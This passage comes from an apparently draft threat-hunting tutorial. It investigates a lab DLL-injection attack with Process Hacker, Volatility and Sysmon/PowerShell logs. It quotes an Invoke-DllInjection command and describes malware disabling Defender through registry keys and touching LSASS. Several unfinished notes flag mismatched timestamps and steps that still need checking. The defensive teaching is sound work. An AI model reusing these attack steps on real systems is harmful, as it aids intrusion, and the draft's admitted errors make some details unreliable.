Further, in the rest of the contents we might be able to find some strings that are associated with specific malware. And typically, rather than trudging it manually we can automate the proces s using [YARA](https://github.com/VirusTotal/yara/releases) rules. 

For example in below we can see [Yara rules authored by Florian Roth for Cobalt Strike](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_wilted_tulip.yar). The image shows a number of string-based rules it would be looking for - all indications that the PE file is part of a Cobalt Strike attack. 

{{< figure src="/img/image079.png" title="" class="custom-figure" >}}

Finally it's worth being aware of `PE Header Stomping` - a more advanced technique used by some attackers to avoid detection. As another great mind in the Threat Hunting space, [Chris Benton](https://twitter.com/chris_brenton?lang=en), likes to say: ***"Malware does not break the rules, but it bends them".***

PE files *have* to have a header, but since nothing really forces or checks the exact contents of the header, the header could theoretically be anything. And so instead of the header containing some giveaways like we saw above - magic bytes, dos stub artifact, signature strings etc - the malware will overwrite the header with something else to appear legitimate. For now I just wanted you to be aware of this, we'll revisit header stomping first-hand in the future. 

But for now, that's it for the theory - *allons-y*!

# Performing the Analysis

Open Process Hacker as admin - ie right-click and select `Run as administrator`. Scroll down until you see `rufus.exe` (or whatever other legitimate process you chose to inject into). Let's go through our 7 indicators and see what results. 

1. Parent-Child relationships

{{< figure src="/img/image053.png" title="" class="custom-figure" >}}

We can immediately see the same suspicious process and parent we saw in our read using the native tools - there is the legitimate process `rufus`, which spawned the child process `rundll32.exe`.And as we discussed then this is suspicious since we do not expect `rufus`, a program used to create bootable USB drives, to need to call `rundll32.exe`. 

But then we see something we forgot to consider in our previous analysis - has `rundll32.exe` itself spawned anything in turn? Here things *really* start getting suspicious - `rundll32.exe` in turned spawned `cmd.exe`. 

I mentioned before that `rundll32.exe` is typically used to launch DLLs. Thus there is **very** little reason for us to expect it to be spawning the Windows command line interpreter `cmd.exe`. Now it could be that some amateur developer wrote some janky code that does this as some befuddling workaround, but in honesty even that is a stretch. We're not ringing the alarm bells yet, but we're definitely geared to dig in deeper.

So double-click on the process... 

2. Signature - is it valid + who signed?

{{< figure src="/img/image054.png" title="" class="custom-figure" >}}

We can see here that it has a valid signature signed by Microsoft, since of course they are the creators of rundll32.exe. Nothing further to concern ourselves with here. 

3. Current directory
In the same image we can see the **Current directory**, that is the "working directory" of the process, which is the directory where the process was started from or where it is operating. We can see here that the current directory is the desktop since that's where it was initiated from. 

Now this could happen with legitimate scripts or applications that are using `rundll32.exe` to call a DLL function. However, seeing `rundll32.exe` being called from an unusual location like a user's desktop could be suspicious, particularly if it's coupled with other strange behavior. 

4. Command-line arguments 
And again in reference to the same image we once more we see that the **Command-line** is `rundll32.exe`. Again, we already saw this before where I discussed why this is suspicous - we expect `rundll32.exe` to be provided with arguments.

5. Thread Start Address
On the top of the Properties window select `Threads`.
{{< figure src="/img/image055.png" title="" class="custom-figure" >}}
We can see under `Start address` that it is mapped, meaning it does exist on disk. So this just tells us that this is not a Reflectively Loaded DLL, since we would expect that to have an unknown address listed as `0x0`.

6. Memory Permissions
- On the top of the Properties window select `Memory`.
- Now click once on the `Protection` header to sort it. 
- Scroll down until you see `RWX` permissions, that is of course if it exists.
{{< figure src="/img/image056.png" title="" class="custom-figure" >}}
- And indeed we see the presence of two memory spaces with **Read-Write-Execute** permissions, which as we learned is always suspicious since there are very few legitimate programs that will write to memory and then immediately execute it. 

7. Memory Content
- Finally let's double-click on the larger of the two (172 kB) since this typically represents the payload.
{{< figure src="/img/image057.png" title="" class="custom-figure" >}}
- And immediately we can see two clear giveaways that we are dealing with a PE file: first we see the magic bytes (`MZ`), and we see the strings we associate with a PE Dos Stub - `This program cannot be run in DOS mode`.
- So once again it seems suspect. 

That's it for our live memory analysis: feel free to exit Process Hacker. Let's discuss our results before moving on to our post-mortem analysis. 

# CLOSING THOUGHTS
Let's quickly review where we are in our simulated threat hunt. We began by using doing a basic live memory analysis using some Windows native tools. Here we discovered an unusual outgoing connection, we then dug deeper into the process responsible for said conneciton (`rundll32.exe`) and learned a few suspicious things. We saw that the process was unexpectedly spawned by another process (`rufus.exe`). Additionally, we noted that the way `rundll32.exe` was invoked from the command line was unusual, as it was devoid of arguments that we would typically expect to see.

We then used `Process Hacker` to reveal even more about `rundll32.exe`. We saw that, in addition to having a suspicious relation to it's parent process (`rufus.exe`), it itself spawned `cmd.exe`, which is *very* unusual. We also learned that it ran from a somewhat suspicious directory, had `RWX` memory space permissions, and ultimately contained a PE file. 

This signifies the end of our ***live analysis***, we'll now proceed with our ***post-mortem analysis***. At this point keep your Windows VM on, shut down your Kali VM, and turn on your Ubuntu VM. 

***

# 7. POST-MORTEM FORENSICS: MEMORY
# HOUSEKEEPING
First thing's first - we need to transfer the packet capture (`dllattack.pcap`) and memory dump (`memdump.raw`) over to our Ubuntu analyst VM. Now there are a number of ways to do this, and if you have your own method you prefer please do go ahead. I'm going to install `Python3` so we can quickly spin up a simple http server.

Before we start just make sure that both files of interest (`dllattack.pcap` and `memdump.raw`) are in the same directory - in my case both are located on the desktop. 

Let's transfer them:
1. First download the `Python3` installer [here](https://www.python.org/downloads/windows/). 
2. Then run the installer, all default selections.
3. Once it's done open an administrative `Command Prompt` and navigate to the desktop. 
4. We can now spawn our **http server**.
```
python -m http.server 8008
```
5. You will more than likely receive a Windows Security Alert, click Allow Access.

{{< figure src="/img/image058.png" title="" class="custom-figure" >}}
6. Now head on over to your Ubuntu analyst VM and open the browser (FireFox). Navigate to `http://[windows_IP]:8008`, in my case that would be `http://192.168.230.158:8008`.

{{< figure src="/img/image061.png" title="" class="custom-figure" >}}

7. Go ahead and save each of the files to wherever you want - for simplicity's sake I will be saving them all directly to the desktop once again. 

We'll now start our Post-Mortem Memory Analysis, before that let's briefly discuss the tool we'll be using.

# ANALYSIS (VOLATILITY)

For our post-mortem analysis we'll be using `Volatility V3`. If you'd like to know more [check out its great documentation.](https://volatility3.readthedocs.io/en/latest/)

One important thing you have to know before we move ahead however is that `Volatility` uses a modular approach. Each time you run it you have to specify a specific `Volatility` plug-in, which performs one specific type of analysis.

So for example here are the plug-ins we'll use and their associated functions:
- `pslist`, `pstree`, and `psinfo` all provide process info.
- `handles` shows us all the handles associated with a specific process.
- `cmdline` shows  the command prompt history.
- `netscan` displays any network connections and sockets made by the OS.
- `malfind` looks for inject code.

So let's get to it. 

NOTE TO SELF: need to redo the screenshots, no longer in folder `artifacts`

**pslist, pstree, and psinfo**
Two of the most common/popular plugs-ins are `pslist` and `pstree`. The former gives us a list of all processes with some key details, `pstree` conversely will also show Parent-Child relationships. Since we've already seen this info multiple times now we'll skip it here, but I wanted be aware that, if for whatever reason you were not able to perform the live analysis, you can gather all the same important process information from the memory dump using `Volatility`.

Let's quickly run `psinfo` to break the ice and remind ourselves of the PID, which we'll need for some of the other plugins.

1. Open a terminal and navigate your your main Volatility3 directory, in my case it is `/home/analyst/Desktop/volatility3`.
2. Let's run our `psinfo` plugin using the following command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.pslist 
```
3. Scroll down until you see `rundll32.exe` and note it's PID, you can see in my example below it's `5060`, we'll use this for our next plug-in. 

{{< figure src="/img/image062.png" title="" class="custom-figure" >}}

**handles**
Now that we've got the PID of our suspicious program we're going to look at its handles. 

A handle is like a reference that a program uses to access a resource - whether that be files, registry keys, or network connections. When a process wants to access one of these resources, the OS gives it a handle, kind of like a ticket, that the process uses to read from or write to the resource. 

For threat hunting it's a great idea to look at the handles of any process you consider suspect since it will give us a lot of information about what the process is actually doing. For instance, if a process has a handle to a sensitive file or network connection that it shouldn't have access to, it could be a sign of malicious activity. By examining the handles, we can get a clearer picture of what the suspicious process is up to, helping us to understand its purpose and potentially identify the nature of the threat.

Now to be frank this analysis of handles can be a rather complex endeavour, relying on a deep techincal understanding of the subject. So I'll show how it works, and of course provide some insight on the findings, but be aware that I won't be able to do an exhaustive exploration of this topic as that could be a multi-hour course in and of itself. 

Let's run the `windows.handles` plugin with the following command, including the PID of `rundll32.exe` as we just learned. 
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060
``` 

We see a large number of output, too much to meaningfully process right now. However what immediately sticks out is `Key` - meaning registry keys. So let's run the same search but utilize `grep` to only see all handles to registry keys:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.handles --pid 5060 | grep Key
``` 
We can see all the results in the image below:

{{< figure src="/img/image063.png" title="" class="custom-figure" >}}

Again, as has been the case before: nothing here is inherently indicative of malware. However, in the case where we suspect something of being malware, many of these registry key handles are commonly absed by malware. 

`MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\IMAGE FILE EXECUTION OPTIONS`: 
This key is commonly used to debug applications in Windows. However, it is also used by some malware to intercept the execution of programs. Malware can create a debugger entry for a certain program, and then reroute its execution to a malicious program instead.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NLS\SORTING\VERSIONS`: This key is related to National Language Support (NLS) and the sorting of strings in various languages. It's uncommon for applications to directly interact with these keys. If the process is modifying this key, it may be an attempt to affect system behavior or mask its activity.

`MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\HWORDER and MACHINE\SYSTEM\CONTROLSET001\CONTROL\NETWORKPROVIDER\PROVIDERORDER`: These keys are related to the order in which network providers are accessed in Windows. Modification of these keys may indicate an attempt to intercept or manipulate network connections.

`MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\PROTOCOL_CATALOG9 and MACHINE\SYSTEM\CONTROLSET001\SERVICES\WINSOCK2\PARAMETERS\NAMESPACE_CATALOG5`: These keys are related to the Winsock API, which is used by applications to communicate over a network. If the process is interacting with these keys, it could be trying to manipulate network communication, which is a common tactic of malware.

**cmdline**
This is one of my favourite modules in Volatility, allowing us to extract command-line arguments of running processes from our memory dump. Here we'll apply it only to the process of interest, but of course keep in mind that we could review the entire available history.

{{< figure src="/img/image096.png" title="" class="custom-figure" >}}

Here we receive the same insight as before, namely that `rundll32.exe` was not provided any arguments when it was invoked from the command line. I'm pointing this out once again so you are aware you can obtain this same information even if you were not able to perform a live analysis. 
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.cmdline.CmdLine --pid 5060 
``` 

**netscan**
The `netscan` plugin will scan the memory dump looking for any network connections and sockets made by the OS.

We can run the scan using the command:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.netscan
```


NO REDO THIS because we want to see the same ip as we got in native tools section for redundancy purposes. 




Right now I'll defer comment, since we're going to jump into network connections DEEPLY in PART X with `Wireshark`, `Zeek`, and `RITA`. I just wanted you to be aware that you can also use a memory dump to look at network connections if for some reason you don't have a packet capture available.   

**malfind**
`malfind` is the quintessential plugin for, well, finding malware. The plugin will look for suspected inject code, which it determines based on header info - much indeed like we did during our live analysis when we look at the memory space content. 

We can run it with:
```
python3 vol.py -f ~/Desktop/artifacts/memdump.raw windows.malfind
```
Below is a sample of the result, which is quite extensive:

{{< figure src="/img/image064.png" title="" class="custom-figure" >}}

We can see that it correctly flagged `rundll32.exe`. However, if we go through the entire list we can see a number of false positives: 
- RuntimeBroker.exe
- SearchApp.exe
- powershell.exe
- smartscreen.exe

This is thus a good reminder that the mere appearance of a process in malfind's output is not an unequivocal affirmation of its malicious nature.

**Closing Thoughts**
This section was admittedly not too revelatory, but really only because we already peformed live analysis. Again, if we were unable to perform a live analysis and only received a memory dump, then this section showed us how we could derive the same (plus some additional) information. Further, even if we did perform the live analysis, we bolster our case when we can come to the same conclusions via another avenue. 

MENTION HERE like alle vidence, the more points yuou have better. in a other case two eye withness tesitmonies beter than 1, 3 better than 2 etc - each strengthens conviction of case. 

I think this serves as a good introduction to `Volatility` - you now have some sense of how it works, how to use it, and what are the "go to" plug-ins for threat hunting.

That being the case let's move on to the log analysis. For this we'll once again use our Windows VM, so in case you turned it off, please turn it back on. 

***

# 8. POST-MORTEM FORENSICS: LOG ANALYSIS
# 8.1 INTRODUCTION

So the time has come for us to get into some LOGGING...

{{< figure src="/img/lumberjack.gif" title="" class="custom-figure" >}}

Now typically we might think of logging as belonging more to the realm of the SOC than a threat hunter. That's because, at least in the way that modern logging practices operate, logging is not seen as something directly approachable by a human operator. Why? Well because of the ***insane*** amount of data involved. It's not unusual for enterprises to generate millions of log events in their SIEM *daily*, and thus it's completly infeasible for a threat hunter to start poking around looking for bread crumbs. We think of logging has something that we feed into the SIEM, and then wait for an alert to act on - i.e. the work of a SOC. 

But, depending on context, there's two potential fallacies at play in this viewpoint.

First, as I emphasized in my article ["Three Modes of Threat Hunting article"](https://www.faanross.com/posts/three_modes/), though log analysis is indeed an unsuitable choice for the initial phase of a threat hunt, it can be an important emergent line of enquiry once we're investigating a lead. In the initial phase we operate only with presumption, but not yet any concrete suspicion. We are looking for that first indication of something being off, and as such if we were to consider the logs at that point we'd need to consider *all* logs. And logs is never something we approach manually without a strong set of selective criteria. 

So, as we are simulating here, once we have found some evidence that we are interested in we can use that to dramatically reduce the total amount of log events we consider. We can use specific processes, actions, event IDs, dates, times etc derived from our initial set of evidence so that we no longer have to consider the entire body of log events as potentially suspicious, rather based on information we already gathered we can whittle it down dramatically and only focus on events potentially related to the suspicious event. 

And the second fallacy related to "logs being a SOC-thing" relates to what logs we consider to even begin with. In other words, the specific logs we are interested in, even before we apply selective criteria as explained above, is typically a subset of all potential logs. It seems that, for whatever reason, the industry has settled on a "more is always better" approach when it comes to logging. There is this underlying idea that the more endpoints and the more logs the better security becomes. And so, for good or **bad**, this is what SOCs engage with each day - a literal avalance of logs. 

{{< figure src="/img/sisy.gif" title="" class="custom-figure" >}}

However when it comes to Threat Hunting and Log Analysis, I view the approach more a kin to the Pareto Principle. The Pareto Principle, also known as the "80-20 rule", states that in most systems 80% of outputs result from 20% of inputs. Contextually applied here, what I mean is that 20% of the logs will account for 80% of potential adverse security events. But in honesty, the proportion here is likely even more extreme - this is a complete guess, but I'd say it's more like ***5% of logs will potentially account for 95% of adverse security events***.

So, instead of focusing on 100% of the logs to potentiually uncover 100% of the adverse security events, we focus on 5% of the logs to potentially uncover 95% of the adverse security events. What exactly constitutes that 5% will become progressively more nuanced as we continue on our journey in future courses, but for now it simply means that we focus on Sysmon and PowerShell ScriptBlock logs and ignore WEL completely. 

So let's go ahead and have a look at each of them in turn starting with Sysmon.  

# 8.2 A QUICK NOTE
We will be using the same Windows VM (ie the victim) to perform the log analysis in this section. Note that this is done purely for the sake of convenience. As of my current understanding (please [tell me](mailto:faan@teonan.com) if I'm wrong), there is no simple way to interact with `.evtx` files in Linux, at least not in the GUI. *Yes, yes* I am aware it's very uncool to prefer use of a GUI, *totally* not 1337. But if you'd be so kind, please allow me a momentary expression of nuance: both the command line and GUI have their strengths and weaknesses and better to select the best based on context than to succumb to dogma. 



So for now it'll just be simpler to move ahead and used the built-in `Event Viewer` in Windows to work with these files. And, since and since I did not want to create another "non-victim" Windows VM for this one task we're going to be using the same one. But please be aware, unless there is literally no alternative you should never do this in an actual threat hunting scenario.  

The reason is quite obvious - performing a post-mortem analysis on a compromised system can potentially taint the results. We have no idea how the breach might be impacting our actions and so to ensure the integrity of our data we need to perform it in a secure environment. 

This also why for example certain antimalware software vendors provide versions of their products that can run directly from a bootable CD or USB drive - to ensure a scan that is unaffected by the resident malware. 

So that cavaeat out of the way, *let's get it on* with Sysmon. 

{{< figure src="/img/getiton.gif" title="" class="custom-figure" >}}


# 8.3 SYSMON
# 8.3.1 INTRODUCTION

So we've installed Sysmon (Section X), enabled it, captured logs with it (Section X), and then exported those logs as a `.evtx` file. But we've not really discussed why we've done any of this. Why don't we simply rely on the default `Windows Event Logs`  (hence forth referred to simply as `WEL`), why go through the additional effort of setting `Sysmon` up?

Well, without pussyfooting around let me just give it to you straight - `WEL` SUCKS. REAL BAD. 

{{< figure src="/img/rubbish.gif" title="" class="custom-figure" >}}

In stark contrast, `Sysmon`, created by a literal living legend [Mark Russinovich](https://twitter.com/markrussinovich), takes about 5 minutes to set up and will DRAMATICALLY improve logging as it relates specifically to security events. 

That's really about all you need to know at this point - WEL bad, Sysmon epic. If you wanted to learn more about Sysmon check out Section X further below. 

# Log Analysis: SYSMON

In case it's off, switch on your Windows VM. I saved the `.evtx` export we performed earlier on the desktop, let's simply double-click on it, which will open it in `Event Viewer`. 

We can immediately see there are 34 recorded events. If you recall, right before we launched the attack we actually cleared the Sysmon logs. So one would expect right after you clear something you start with 0, but here actually (and with many logging systems), the very act of clearing the log is immediately logged in the new log. This is done for obvious security reasons, and as a consequence we start anew with 2 log entries.

Given this, the entire incident we performed generated 

This means of course that the event produced a maximum of 32 event logs. I say a maximum because it's likely something else could have generated a log entry - we'll find out soon enough. 

Now with logs, especially a small-ish set like we have here, I always like starting off by looking at everything at a high level. Let's see if we can see any interesting trends or patterns. 

{{< figure src="/img/image080.png" title="" class="custom-figure" >}}

The first thing we notice is we have a number of different event IDs - `1`, `3`, `5`, `10`, `12`, `13`, and `22`.

Now each of these represent a specific category event. I'm not going to hamstring us by reviewing them all here now, instead if you'd like check this [awesome overview by our friends from Black Hills Infosec](https://www.blackhillsinfosec.com/a-sysmon-event-id-breakdown/). I recommend reviewing each of them briefly, but if not you'll still be able to follow along. 

So as I said, we can ignore our first two event entries since we know they are related to clearing the logs.

Looking at the `Date and Time` stamp we can also deduce that the next two entries are probably not part of our attack. We can see that they form their own little time cluster, and then starting with the fifth entry(`ID 22: DNS`), we can see a time cluster in which nearly all the events happen. This is likely where the action is, so let's start there. 

{{< figure src="/img/image081.png" title="" class="custom-figure" >}}

We can see that PowerShell is performing a DNS request for the FQDN `raw.githubusercontent.com`. This is of course a result of the command we ran which downloaded the script from the web server before injecting it into memory.

And so take a moment to think of what this means - when an attacker uses a stager, and as is mostly the case that stager then initially goes out to a web server to retrieve another script, there will be DNS footprint. Thus DNS, for this reason and others we'll discuss in the future, is always an important dimension to dig into when threat hunting C2. 

There is a caveat here however - DNS resolution only occurs if the web server the stager reaches out to is specified as a FQDN and not an IP. In the command we ran we instructed it to reach out to `raw.githubusercontent.com` (FQDN), and not for example to `101.14.18.44`, hence DNS resolution and a Sysmon event ID 22 occurred. 

From the malware author's POV, there are pro's and cons to taking either approach. I don't have any data to back this up, but if I had to venture a guess I'd say specifiying the server using a FQDN is more common. Regardless - be aware of this. 

The good news though is whether or not the author specified the server using FQDN or IP, we would see the following entry (`ID 3`) regardless. 

{{< figure src="/img/image081.png" title="" class="custom-figure" >}}

This entry is a record of the actual network connection between the victim and the server. This is great for us since we can always expect to find such a log entry, and it will provide us with both the IP as well as hostname of the server where the script was pulled from. 

Additionally, we can see here that `powershell.exe` is the program responsible for creating the connection. Now if we imagine this was an actual event where a user unwittingly opened a malicious Word document (`.docx`), you might guess that we'd see `winword.exe` instead of `powershell.exe`. But not so - since `winword.exe` cannot itself initiate a socket connection we would indeed most likely see `powershell.exe` (or something else) responsible for the network connection. 

Further, on a "regular" user's station we'd mostly expect to see outside network connections created by the browser, email client, and a variety of Windows processes (backend communcation with MS). We would not however, in most situations, expect to see `powershell.exe` creating them. Note there are *many* potential exception to this, and of course if the system belongs to an administrator etc then this would be quite normal. 

NOTE TO MYSELF: It seems to me I opened rufus (perhaps two copies), since there is immediately a 1 (create), 5 (terminate), and then again a 1. So for now I will ignore the first pair of 1 and 5, as if they do not exist. However absolutely have to verify this!

We can ignore the next 2 entries (`smartscreen.exe` `ID 1`, `consent.exe` `ID 1`), but immediately after we can see the process creation for `rufus.exe`. As I mentioned earlier - since an actual attacker will almost certainly inject into an existing process this log is pragmatically irrelevant. 

We then again encounter a few Windows services we can ignore for now:
- vdsldr.exe `ID 1`, 
- svchost.exe `ID 10`,
- vds.exe `ID 1`

We then encounter a series of three **very interesting** logs - `ID 13`, `ID 12`, `ID 13`. These are really awesome since, as you'll soon see, they give us insight into an inner workings of the malware that even us as "the attacker", were not aware of.

The first of the three entries (`ID 13`) is shown below. 

{{< figure src="/img/image082.png" title="" class="custom-figure" >}}

So we immediately see that `rufus.exe`, a program that supposedly is used for the sole purpose of creating bootable USB drives, has modified a Windows registry key. This is obvs quite strange, even more so if we look at the name of the actual key we can see it ends with `DisableAntiSpyware`. 

Further, we can see the value has been set to 1 (`DWORD (0x00000001)`). Now a value of 1 actually means 'enable', but since the registry key `DisableAntiSpyware` is a double negative, by enabling it you are in effect disabling the actual antispyware function.

So of course this was not `rufus.exe`, but the malware that's injected into it performing these actions. It is in effect turning off a feature of MS Defender's antispyware functionality, which is fairly common behaviour for malware. 

The next log entry (`ID 12`) indicates that a deletion event has occurred on a registry key.

{{< figure src="/img/image083.png" title="" class="custom-figure" >}}

We can see the registry key has the same name as above (`DisableAntiSpyware`), *but*, critically, we have to pay attention to the full paths of the *TargetObject*. The first one is located under `HKU\...`, while the one here is located under `HKLM\...`. `HKU` stands for ***HKEY_USERS***, and `HKLM` stands for ***HKEY_LOCAL_MACHINE***. These are two major registry hive keys in the Windows Registry.

What you should also know is that the HKU hive contains configuration information for Windows user profiles on the computer, whereas the HKLM hive contains configuration data that is used by all users on the computer. In other words the first one deals with the specific user, the second deals with the entire system. 

Further, we can also see that instead of `rufus.exe` performing the actions here, it is performed by `svchost.exe`. In case you were not aware this is a legitimate Windows process, and further, it being co-opted for nefarious purposes by malware is quite common. That's because hackers LOVE abusing `svchost.exe` for a slew of reasons - its ubiquity, anonymity, persistence, stealth and potential for gaining elevated privileges. 

And in fact it seems this might be the primary reason for the malware switching processes - changes to `HKLM`  require elevated privileges because they affect the entire system, not just a single user. The `svchost.exe` process was running with System privileges (the highest level of privilege), which allowed it to modify the system-wide key.

Ok before we fully get stuck into this let's review the last entry since we need to see the entire picture before we are able to make complete sense of it. 

{{< figure src="/img/image084.png" title="" class="custom-figure" >}}

Here we can see the same action as performed in our first entry, ie disabling the antispyware function by setting the value to 1 (disabling through enabling the disabling function - thanks MS!). But this time it affects the `HKLM` hive instead of the `HKU` hive. In other words, where the first entry disabled antispyware for the specific user, this now disables it for the entire system. 

But then why the deletion event preceding this? The most likely reason the malware is doing this is to ensure that by returning the registry key to the default state (which is what deleting it in effect does), it will behave exactly as is expected. In this way it ensures that the system doesn't have an unexpected configuration that could interfere with the malware's actions.

This is of course speculation on my part - the only way for us to truly understand what this malware is doing so we can start getting a clear picture of the malware author's intention would be to actually reverse it, which is of course literally an entire other discipline in and of itself. That being the case this is where our speculation on this matter will remain, we will however be jumping into the amazing world of malware analysis in the future. As a threat hunter you are not expected to be an absolute wizard at it, but your abilities as a hunter will expand dramatrically if you add a basic understanding of this tool to your kit. 

But for now, let's toodle on. 

{{< figure src="/img/silly_walk.gif" title="" class="custom-figure" >}}

Following this  we see a handful of events with `ID 10`, followed by another series of events all with `ID 1`. 

{{< figure src="/img/image085.png" title="" class="custom-figure" >}}

We can see they all involve `svchost.exe`, giving us the sense that this might once again be the malware. Fully interpreting and making sense of these event logs is however beyond the scope of this course, so for now we'll pass. 

Next we encounter another DNS resolution entry (`ID 22`), this one is however a little bit more befuddling. 

{{< figure src="/img/image086.png" title="" class="custom-figure" >}}

Here we can see `svchost.exe` (let's still assume this is the malware) is doing a DNS query for  DESKTOP-UKJG356. This is however the name of the very host it currently compromised. So why would malware do this - why would it do a DNS resolution to find the ip of the host it has currently infected? Well, there are several potential reasons. One possible explanation is that it is doing internal fingerprint, it might also for example be testing network connectivity to check whether it is in a sandboxed environment - in which case it will alter its behaviour. These are again educated guesses, and as was the case above we'll have to dig into its guts to really understand what it's intention is.

Next we can see some events (`ID 10`) where `powershell.exe` is accessing `lsass.exe`.

{{< figure src="/img/image087.png" title="" class="custom-figure" >}}

LSASS, or the Local Security Authority Subsystem Service, is a process in Microsoft Windows operating systems responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens. Given its involvment in security and authentication it's probably no great shock to learn that malware LOVES abusing this process. It is involved in a myriad of attack types - credential dumping, pass-the-hash, pass-the-ticket, access token creation/manipulation etc. 

We can see in the log entry the GrantedAccess field is set to `0x1000`, which corresponds to `PROCESS_QUERY_LIMITED_INFORMATION`. This means the accessing process has requested or been granted the ability to query certain information from the LSASS process. Such information might include the process's existence, its execution state, the contents of its image file (read-only), etc. Given the context, this log could indicate potential malicious activity, such as an attempt to dump credentials from LSASS or a reconnaissance move before further exploitation. 

And then finally we see two events with `ID 1`, the first of which is another crucial piece of evidence indicative of malware activity. 

{{< figure src="/img/image088.png" title="" class="custom-figure" >}}

Here we can see the Windows Remote Assistance COM Server executable (`raserver.exe`) has been launched. This tool is used for remote assistance, which allows someone to connect to this machine remotely to assist with technical issues.

The flag `/offerraupdate` used in the CommandLine for `raserver.exe` suggests that it was started to accept unsolicited Remote Assistance invitations. This allows remote users to connect without needing an invitation. This Remote Assistance tool can provide an attacker with a remote interactive command-line or GUI access, similar to Remote Desktop, which can be used to interact with the system and potentially exfiltrate data. 

And then in the last event log we can see our old friend `rundll32.exe` - the suspicious process we first encountered way back when we looked at unusual network connections. This was of course what set us down this path of threat hunting in the first place. 

{{< figure src="/img/image088.png" title="" class="custom-figure" >}}

And we learn the same things we've seen now a couple of times in our memory forensics analysis - the process was invoked without arguments, the process was started from an unusual location (desktop), and that the parent process is `rufus.exe`.

I really want you to take a moment and take in these set of circumstances since they are really all, taken together, indicative of a standard dll-injection attack. 

NOTE TO SELF: not sure if i remembered to drop the cmd shell from meterpreter when i ran this simulation. redo and double-check! also remember it looks like the process rufus was opened, closed, then opened (maybe you opened a second copy by mistake?), so need to check this too. 

# 8.4 POWERSHELL LOGS
# 8.4.1 INTRODUCTION

We've now discussed numerous times the major role PowerShell in the modern attacking paradigm known as "Living off the Land" (LoL) attacks. Thus I think it's probably obvious why it would be a huge advantage for us to be able to see records of commands that were run in PowerShell. That being said, let's just jump straight into the logs. 

# 8.4.2 ANALYSIS

In Section X.X we exported the PowerShell ScriptBlock logs to dekstop as `xxxx.evtx` - let's go ahead and open it in Event Viewer by double-clicking on the file.

We can immediately see that 15 events were logged in total. As was the case with Sysmon, the first two entries are artifacts from clearing the logs immediately prior to running our attack. Thus in total our attack resulted in 13 log entries. 

NOTE: There are actually 17. The first two are from the rest, next two are from me querying amount of log entries - so let's ignore those completely here, we will rerun without doing it. 

NOTE: Once again, as was the case above, am unsure whether I actually ran the cmd drop so have to redo and double-check.

So again let's first look at everything on a high-level to see what patterns we can identify, a few things immediately stand out.

{{< figure src="/img/image089.png" title="" class="custom-figure" >}}

First, we can see that all the entries are assigned the lowest warning level (`Verbose`) with a single expection that is categorized as a `Warning`. Let's make a note to scrutinise this when we get to that entry.

NOTE TO SELF: The times between sysmon and powershell do not match so we def have to redo both and capture times at same time. in fact need to redo thing entirely according to instructions layed out here so we can be sure everything is sync'ed in terms of date time etc. 

The next obvious thing we can see is that every single event ID is the exact same - `4104`. This may seem strange but is actually expected - PowerShell script block logging is indeed associated with Event `ID 4104` in Windows systems. This event ID is specific to script block logging and records the execution of PowerShell commands or scripts.

And then one final observation: look at the date and time stamps. Do you notice anything peculiar? 

It seems to me that almost all the entries (for but a single exception) come in pairs - that is each timestamp occurs in multiples of two's. Let's be sure to also see what's happening there. Ok great so now that we've spotted some interesting patterns let's just go ahead and jump right in.

Note that as was the case with Sysmon, the first two entries are artifacts created when we cleared the log. We can once again skip these. 

In the third entry then we can immediately see the log related to our PowerShell command that went to download the injection script from the web server and injected it into memory. 

{{< figure src="/img/image090.png" title="" class="custom-figure" >}}

This is worth taking note of since in a "real-world" attack scenario we would expect something similar to run from the stager. 

Right after this we have the only entry with an assigned level of `Warning` (the highest in this specific sample), so let's see what the deal is.

{{< figure src="/img/image091.png" title="" class="custom-figure" >}}

Note the entire log entry is too large to reproduce here in its entirety, but it should immediately become clear what we're looking at here - the actual contents of the script we just downloaded and injected into memory!

So when we ran the preceding IEX command, it downloaded the script from the provided URL and injected it directly in memory. Since PowerShell ScriptBlock logging is enabled, the entire content of the downloaded script is logged as a separate entry. This is awesome for us since, again, if this was an actual attack it means we'd be able to see the actual script content that was downloaded and injected into memory. 

Immediately after this we can see another log entry with the same time stamp that simply says `prompt`.

{{< figure src="/img/image092.png" title="" class="custom-figure" >}}

Remember when we looked at everything at the start and we noticed how all the entries come in pairs? Well, this is what we are looking at here - the second half of the pair. I won't repeat this for the remainder of this analysis, but you'll notice if you go through it by yourself that every single PowerShell ScriptBlock log entry will be followed by another like this that simply says `prompt`.

So what's going on here? Well whenever you interact with PowerShell, it actually performs a magical sleight-of-hand. Think of when you yourself have a PowerShell terminal open - you see the prompt, you run a command, it executes, and then once again you see the prompt, ready for you to enter the subsequent command.

IMAGE HERE OF WHAT YOU MEAN

So it seems to us as the observer that once the command we ran is complete PowerShell just magically drops back into the prompt, as if it is the default state to which PowerShell just returns to automatically each time. But this is actually not so. When we run a command PowerShell executes it and then, unbeknownst to us, it runs another function in the background called `prompt`. It's that what creates the `PS C:\>` that you see before entering any command.

So this is perfectly normal and expect to always see it - for every PowerShell command that runs, it will be followed by a `prompt` log. 

So moving on to the rest of the log entries we'll notice some other commands we ran. First there is the `ps` command we used to get the process ID for `rufus.exe`. However, since as I mentioned before this is not expected to occur in an actual attack we can ignore this.

We then see the log entry for the command that actually injected the malicious DLL into `rufus.exe`, again something we would expect to see in an actual attack. 

{{< figure src="/img/image093.png" title="" class="custom-figure" >}}

This is then followed by two other entries with the exact same time-stamp, containing commands we did not explicitly run. However, as the time stamp is the exact same, we can assume they resulted from the command we ran (`Invoke-DllInjection -ProcessID 3468 -Dll C:\Users\User\Desktop\evil.dll`).

{{< figure src="/img/image094.png" title="" class="custom-figure" >}}

So what might be happening here? There entries are likely related to the process of interacting with or analyzing assemblies, possibly as part of the DLL injection procedure. My best guess is that the script blocks might be inspecting certain properties of assemblies to determine whether they meet specific criteria. As was the case before, this is not really a rabbit hole that will offer much value for us here and now, so let's move ahead. 

